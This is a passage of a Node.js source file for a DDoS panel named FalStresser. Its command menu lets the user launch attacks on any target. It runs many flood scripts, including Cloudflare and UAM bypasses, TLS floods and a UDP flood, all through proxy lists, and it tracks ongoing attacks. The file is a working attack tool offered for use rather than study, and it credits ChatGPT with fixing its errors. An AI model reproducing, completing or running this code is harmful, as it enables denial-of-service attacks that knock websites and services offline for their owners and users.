        exec(`node ${CLOUDFLARE} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${nightc2} ${target} ${duration} 100 10 proxy.txt flood`)
        exec(`node ${xhttp} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${hand} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${starstls} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${UAM} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${uambypass} ${target} ${duration} 100 proxy.txt`)
        exec(`node ${tlskill} ${target} ${duration} 100 10`)
        exec(`node ${vss} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${vssn} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${vssny} ${target} ${duration} 100 10 proxy.txt FLOOD`)
        exec(`node ${skynet} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${vxx} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${thunder} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${Medusa} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${dbotnet} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${ASTRAL} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: udp <target> <port> <duration>
udp 123.456.78.910 53 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
\x1b[96m⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⣠⣦⡀⠀⠀⠀\x1b[0m
\x1b[96m⠀⠀⠛⣿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣿⠛⠀⠀⠀⠀⠀⡀⠺⣿⣿⠟⢀⡀⠀\x1b[0m
\x1b[96m⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣦⠈⠁⣴⣿⣿⡦\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣦⡈⠻⠟⢁⣴⣦⡈⠻⠋⠀\x1b[0m
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡀⠺⣿⣿⠟⢀⡀⠻⣿⡿⠋⠀⠀⠀\x1b[0m    
\x1b[96m⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⡿⠿⣿⣦⡈⠁⣴⣿⣿⡦⠈⠀⠀⠀⠀⠀\x1b[0m    
\x1b[96m⠲⣿⠷⠂⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⣠⣦⡈⠻⣿⣦⡈⠻⠋⠀⠀⠀ ⠀⠀⠀⠀\x1b[0m   
\x1b[96m⠀⠈⠀⠀⠀⠀⠀⠀⠀⠰⣿⣿⡀⠺⣿⣿⣿⡦⠈⣻⣿⡦⠀⠀⠀⠀⠀⠀ ⠀⠀\x1b[0m   
\x1b[96m⠀⠀⠀⠀⠀⠀⠀⠀⣠⣦⡈⠻⣿⣦⡈⠻⠋⣠⣾⡿⠋⠀⠀  ⠀ ⠀⠀   ⠀\x1b[0m ⠀
\x1b[96m⠀⠀⠀⠀⠀⠀⡀⠺⣿⣿⠟⢀⡈⠻⣿⣶⣾⡿⠋⣠⣦⡀⠀⢀⣠⣤⣀⡀ ⠀ ⠀\x1b[0m  
\x1b[96m⠀⠀⠀⠀⣠⣾⣿⣦⠈⠁⣴⣿⣿⡦⠈⠛⠋⠀⠀⠈⠛⢁⣴⣿⣿⡿⠋⠀ ⠀⠀\x1b[0m
\x1b[96m⠀⠀⣠⣦⡈⠻⠟⢁⣴⣦⡈⠻⠋⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣏⠀⠀⠀⠀⠀ \x1b[0m
\x1b[96m⠀⠺⣿⣿⠟⢀⡀⠻⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⡿⠛⠁⠙⣷⣶⣦⠀⠀ \x1b[0m
\x1b[96m⠀⠀⠈⠁⣴⣿⣿⡦⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠻⠿⠟⠀⠀ \x1b[0m
\x1b[96m⠀⠀⠀⠀⠈⠻⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[0m

Target   : ${target}
Duration : ${duration}
Methods  : udp
Creator  : FAL`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/udp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/dalyudiyudi12345/kamunanya/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By BALDEV

Thx To:
ChatGPT ( Fixing Error )
Member And User ( Ga Buat Yang Dapet Gratis )
My Family
PLN Dan Wifi
Github
YouTube ( Music )
Allah SWT
`
permen.question('╭─[\x1b[1m\x1b[32mFalStresser\x1b[0m]: \n╰┈┈➤',(input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'menu') {
    console.log(`
    ──────────────────────────────────────────────
COMMAND MENU
- attack
- methods
- C
- news
- Monitor
──────────────────────────────────────────────
`);
    sigma();
    } else if (command === 'methods') {
    console.log(`
──────────────────────[ATTACK OPERATIONS]──────────────────────
   • Attack  - Launch Attack with Server
───────────────────────[ATTACK METHODS]───────────────────────
 ► VIP
     - API [VIP] [ BYPASS-CF, GOOGLE LCC, CLOUDFLARE, NON PROTEK ]
     - HTTP [GOOD] [ BYPASS-CF, GOOGLE LCC ]
     - MIX [ BYPASS-CF, UAM, NON PROTEK ]
     - TLS [ CLOUDFLARE INC, LOW POWER ] 
     - SIGMA [ BYPASS-CF, PROTEK ON ]
     - FAL [GOOD] [ BYPASS ALL, RAPID ] 
     - GLORY [ NON SPAM ]
 ► Bypass & Flood
     - FLOOD [ DDOS PANEL ]
     - BYPASS [ NON PROTEK, CLOUDFLARE INC ]
────────────────────────────────────────────────────────────
`);
    sigma();
      } else if (command === 'monitor') {
    ongoingAttack()
    sigma()
      } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
      } else if (command === 'attack') {
    AttackBotnetEndpoints(args) 
    } else if (command === 'udp') {
    udp_flood(args);
  } else if (command === 'C') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()